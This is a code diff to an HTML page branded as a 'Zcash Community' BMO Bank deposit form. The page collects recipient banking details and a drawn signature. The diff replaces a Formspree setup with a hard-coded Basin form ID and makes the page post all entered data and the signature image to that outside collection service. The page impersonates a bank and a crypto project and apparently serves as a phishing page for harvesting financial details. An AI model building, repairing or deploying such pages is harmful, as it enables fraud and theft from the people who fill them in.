@@ -74,9 +74,7 @@
     <header class="header"><div class="logo">Z</div><div class="brand">Zcash <span class="verified">✔</span></div></header>
     <div class="title"><div class="kicker">ZCASH COMMUNITY</div><h1>BMO BANK N.A. DEPOSIT FORM</h1><p class="subtitle">Recipient banking details for fund transfer</p><div class="underline"></div></div>
 
-    <!-- FORMSPREE CONFIG -->
-    <input type="hidden" name="_subject" value="New Zcash Community BMO Deposit Form" />
-    <input type="hidden" name="_template" value="table" />
+    <!-- BASIN CONFIG -->
     <input type="hidden" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
 
     <div class="bmo-banner">
@@ -160,8 +158,8 @@
 <script>
 (() => {
   // ====== CONFIG ======
-  const FORMSPREE_ENDPOINT = "https://usebasin.com/f/YOUR_BASIN_FORM_ID"method="POST" enctype="multipart/form-data">
-  const SIGNATURE_SRC = "signature.png"; // Optional: place in repo root to pre-stamp
+  const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb"; // <— YOUR BASIN FORM ID
+  const SIGNATURE_SRC = "signature.png"; // Optional pre-stamp image in repo root
   // ====================
 
   const form = document.getElementById("bmoForm");
@@ -324,12 +322,15 @@
     submitBtn.textContent = "Submitting…";
 
     const formData = new FormData(form);
+    // Ensure the form posts to Basin, not the current page
+    form.action = BASIN_ENDPOINT;
+
     try {
       // Canvas → Blob (cross-browser)
       const sigBlob = await new Promise(res => canvas.toBlob(b => res(b), "image/png"));
       formData.append("signature", sigBlob, "signature.png");
 
-      const res = await fetch(FORMSPREE_ENDPOINT, {
+      const res = await fetch(BASIN_ENDPOINT, {
         method: "POST",
         body: formData,
         headers: { "Accept": "application/json" }
@@ -357,4 +358,4 @@
 })();
 </script>
 </body>
-            </html>
+</html>
